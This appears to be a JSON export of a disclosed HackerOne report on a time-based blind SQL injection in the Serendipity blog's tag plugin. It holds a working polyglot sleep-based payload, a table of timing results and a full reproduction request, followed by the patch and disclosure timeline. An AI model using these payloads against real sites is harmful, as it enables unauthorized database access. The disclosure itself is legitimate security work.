@@ -1,0 +1,370 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-11-09T21:02:58.066Z", 
+    "voters": [
+        "eveeez", 
+        "geeknik", 
+        "mygf", 
+        "apapedulimu", 
+        "smit", 
+        "spetr0x", 
+        "sameerphad72", 
+        "ramster", 
+        "supremegoddess"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 374027, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-11-09T14:31:20.741Z", 
+    "vulnerability_information": "**Summary:** \nThere exists a possibility that your Serendipity installation is vulnerable to a blind sql injection.\n\n**Description:** \nBy sending specially crafted SQL commands to `/plugin/tag/` and timing how long it takes for the server to respond, it is quite possible that the blog backend is interepreting this as actual SQL commands and not just user input.\n\nFor example, if we visit `https://betterscience.org/plugin/tag/peerj` we get all articles tagged with `peerj`. I ran the following timed tests replacing `peerj` with the sql commands below:\n\n```\nif(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/ => 3.276 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.28 s\nif(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'\"XOR(if(now()=sysdate(),sleep(9),0))OR\"*/ => 9.298 s\nif(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ => 6.272 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.265 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.25 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.265 s\nif(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ => 6.256 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.437 s\n```\n\n## Steps To Reproduce:\n\nRequest:\n```\nGET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1\nX-Requested-With: XMLHttpRequest\nReferer: https://betterscience.org:443/\nCookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendipity[name]=dxctfnid; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22\nHost: betterscience.org\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\n\n```\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Impact\n\nWithout sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "low", 
+            "availability": "low"
+        }, 
+        "rating": "high", 
+        "score": 7.3, 
+        "author_type": "User"
+    }, 
+    "title": "blind sql injection", 
+    "is_member_of_team?": null, 
+    "vote_count": 9, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "*.betterscience.org", 
+        "max_severity": "critical", 
+        "databaseId": 11141, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-12-09T14:31:20.797Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-30T05:32:01.568Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-30T05:32:01.568Z", 
+            "actor": {
+                "username": "geeknik", 
+                "url": "/geeknik", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/276/9b441990828d1a89d32990f39813a18ffb68da86_medium.jpg?1532034474"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "This same flaw affects `blog.hboeck.de` as well.", 
+            "markdown_message": "<p>This same flaw affects <code>blog.hboeck.de</code> as well.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2963238, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-30T08:06:48.048Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-30T08:06:48.048Z", 
+            "actor": {
+                "username": "hanno", 
+                "url": "/hanno", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/918/0cbb82765672dbb4db446f4f2bda31226dbc2076_medium.jpg?1535099750"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "Confirmed.\n\nI patched this specific piece, but the code looks very suspicious [1]. I reported it to the developer of serendipity and told him to credit you when they make a fix.\n\n[1] https://github.com/s9y/additional_plugins/blob/master/serendipity_event_freetag/serendipity_event_freetag.php", 
+            "markdown_message": "<p>Confirmed.</p>\n\n<p>I patched this specific piece, but the code looks very suspicious [1]. I reported it to the developer of serendipity and told him to credit you when they make a fix.</p>\n\n<p>[1] <a title=\"https://github.com/s9y/additional_plugins/blob/master/serendipity_event_freetag/serendipity_event_freetag.php\" href=\"/redirect?signature=86d687880f48b514f0f9ba8f382f853bc3958f8c&amp;url=https%3A%2F%2Fgithub.com%2Fs9y%2Fadditional_plugins%2Fblob%2Fmaster%2Fserendipity_event_freetag%2Fserendipity_event_freetag.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/s9y/additional_plugins/blob/master/serendipity_event_freetag/serendipity_event_freetag.php</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2963429, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-18T17:39:33.608Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-18T17:39:33.608Z", 
+            "actor": {
+                "username": "hanno", 
+                "url": "/hanno", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/918/0cbb82765672dbb4db446f4f2bda31226dbc2076_medium.jpg?1535099750"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "This is now fixed with a patch I got from s9y's dev (as should be all other open issues).\nI'd appreciate if you could check that and also look for further issues, s9y will soon release a security update.", 
+            "markdown_message": "<p>This is now fixed with a patch I got from s9y&#39;s dev (as should be all other open issues).<br>\nI&#39;d appreciate if you could check that and also look for further issues, s9y will soon release a security update.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3063075, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-19T10:49:32.655Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-19T10:49:32.655Z", 
+            "actor": {
+                "username": "geeknik", 
+                "url": "/geeknik", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/276/9b441990828d1a89d32990f39813a18ffb68da86_medium.jpg?1532034474"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "The sqli looks fixed on my end and I haven't found any additional bugs at the moment.", 
+            "markdown_message": "<p>The sqli looks fixed on my end and I haven&#39;t found any additional bugs at the moment.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3068270, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "geeknik", 
+                "url": "/geeknik"
+            }, 
+            "created_at": "2018-08-16T13:35:29.601Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-16T13:35:29.601Z", 
+            "actor": {
+                "username": "hanno", 
+                "url": "/hanno", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/918/0cbb82765672dbb4db446f4f2bda31226dbc2076_medium.jpg?1535099750"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "Fixed here:\nhttps://github.com/s9y/additional_plugins/commit/3edecdb7eccc24e0d5c63a3d5702dba54599bda3", 
+            "markdown_message": "<p>Fixed here:<br>\n<a title=\"https://github.com/s9y/additional_plugins/commit/3edecdb7eccc24e0d5c63a3d5702dba54599bda3\" href=\"/redirect?signature=331e6f361ccb6f32710d5e0bba9a52c83778c72d&amp;url=https%3A%2F%2Fgithub.com%2Fs9y%2Fadditional_plugins%2Fcommit%2F3edecdb7eccc24e0d5c63a3d5702dba54599bda3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/s9y/additional_plugins/commit/3edecdb7eccc24e0d5c63a3d5702dba54599bda3</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3203968, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-16T18:40:19.307Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-16T18:40:19.307Z", 
+            "actor": {
+                "username": "geeknik", 
+                "url": "/geeknik", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/276/9b441990828d1a89d32990f39813a18ffb68da86_medium.jpg?1532034474"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "Yay for the fix, boo for the lack of credit by the author.", 
+            "markdown_message": "<p>Yay for the fix, boo for the lack of credit by the author.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3205713, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-17T08:40:59.885Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-17T08:40:59.885Z", 
+            "actor": {
+                "username": "hanno", 
+                "url": "/hanno", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/918/0cbb82765672dbb4db446f4f2bda31226dbc2076_medium.jpg?1535099750"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "Now announced on the s9y blog and with credits:\nhttp://blog.s9y.org/archives/279-serendipity_event_freetag-Security-update.html", 
+            "markdown_message": "<p>Now announced on the s9y blog and with credits:<br>\n<a title=\"http://blog.s9y.org/archives/279-serendipity_event_freetag-Security-update.html\" href=\"/redirect?signature=793119097f7cac6daebd4ccc410585f9ea2dfbb4&amp;url=http%3A%2F%2Fblog.s9y.org%2Farchives%2F279-serendipity_event_freetag-Security-update.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blog.s9y.org/archives/279-serendipity_event_freetag-Security-update.html</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3208384, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-09T14:31:20.762Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-09T14:31:20.762Z", 
+            "actor": {
+                "username": "hanno", 
+                "url": "/hanno", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/918/0cbb82765672dbb4db446f4f2bda31226dbc2076_medium.jpg?1535099750"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3617221, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-09T21:02:58.085Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-09T21:02:58.085Z", 
+            "actor": {
+                "username": "geeknik", 
+                "url": "/geeknik", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/276/9b441990828d1a89d32990f39813a18ffb68da86_medium.jpg?1532034474"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3620588, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-09T21:02:58.123Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-09T21:02:58.123Z", 
+            "actor": {
+                "username": "geeknik", 
+                "url": "/geeknik", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/276/9b441990828d1a89d32990f39813a18ffb68da86_medium.jpg?1532034474"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "hannob", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3620589, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": false, 
+    "reporter": {
+        "username": "geeknik", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/geeknik", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/012/276/a940a20d5207bd6044c795859801e3b1e1828604_small.jpg?1532034474"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 67, 
+        "name": "SQL Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": 231403.041617592, 
+    "disclosed_at": "2018-11-09T21:02:58.104Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/374027", 
+    "created_at": "2018-06-29T20:39:25.675Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Summary:</strong> <br>\nThere exists a possibility that your Serendipity installation is vulnerable to a blind sql injection.</p>\n\n<p><strong>Description:</strong> <br>\nBy sending specially crafted SQL commands to <code>/plugin/tag/</code> and timing how long it takes for the server to respond, it is quite possible that the blog backend is interepreting this as actual SQL commands and not just user input.</p>\n\n<p>For example, if we visit <code>https://betterscience.org/plugin/tag/peerj</code> we get all articles tagged with <code>peerj</code>. I ran the following timed tests replacing <code>peerj</code> with the sql commands below:</p>\n<pre class=\"highlight plaintext\"><code>if(now()=sysdate(),sleep(3),0)/*&#39;XOR(if(now()=sysdate(),sleep(3),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(3),0))OR&quot;*/ =&gt; 3.276 s\nif(now()=sysdate(),sleep(0),0)/*&#39;XOR(if(now()=sysdate(),sleep(0),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; 0.28 s\nif(now()=sysdate(),sleep(9),0)/*&#39;XOR(if(now()=sysdate(),sleep(9),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(9),0))OR&quot;*/ =&gt; 9.298 s\nif(now()=sysdate(),sleep(6),0)/*&#39;XOR(if(now()=sysdate(),sleep(6),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; 6.272 s\nif(now()=sysdate(),sleep(0),0)/*&#39;XOR(if(now()=sysdate(),sleep(0),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; 0.265 s\nif(now()=sysdate(),sleep(0),0)/*&#39;XOR(if(now()=sysdate(),sleep(0),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; 0.25 s\nif(now()=sysdate(),sleep(0),0)/*&#39;XOR(if(now()=sysdate(),sleep(0),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; 0.265 s\nif(now()=sysdate(),sleep(6),0)/*&#39;XOR(if(now()=sysdate(),sleep(6),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; 6.256 s\nif(now()=sysdate(),sleep(0),0)/*&#39;XOR(if(now()=sysdate(),sleep(0),0))OR&#39;&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; 0.437 s\n</code></pre>\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>Request:</p>\n<pre class=\"highlight plaintext\"><code>GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*&#39;XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR&#39;%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1\nX-Requested-With: XMLHttpRequest\nReferer: https://betterscience.org:443/\nCookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendipity[name]=dxctfnid; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22\nHost: betterscience.org\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\n\n</code></pre>\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>List any additional material (e.g. screenshots, logs, etc.)</li>\n</ul>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://hboeck.de/", 
+            "about": "Personal web projects from Hanno B\u00f6ck.", 
+            "twitter_handle": "hanno", 
+            "name": "Hanno's projects"
+        }, 
+        "handle": "hannob", 
+        "url": "https://hackerone.com/hannob", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/030/278/253800fbe8bfabdc72f03b7f0f1ddb38adb47f82_small.?1529948333", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/030/278/dfe1a45d96316ca04d5f928eaff3e62f576945a8_medium.?1529948333"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 30278, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
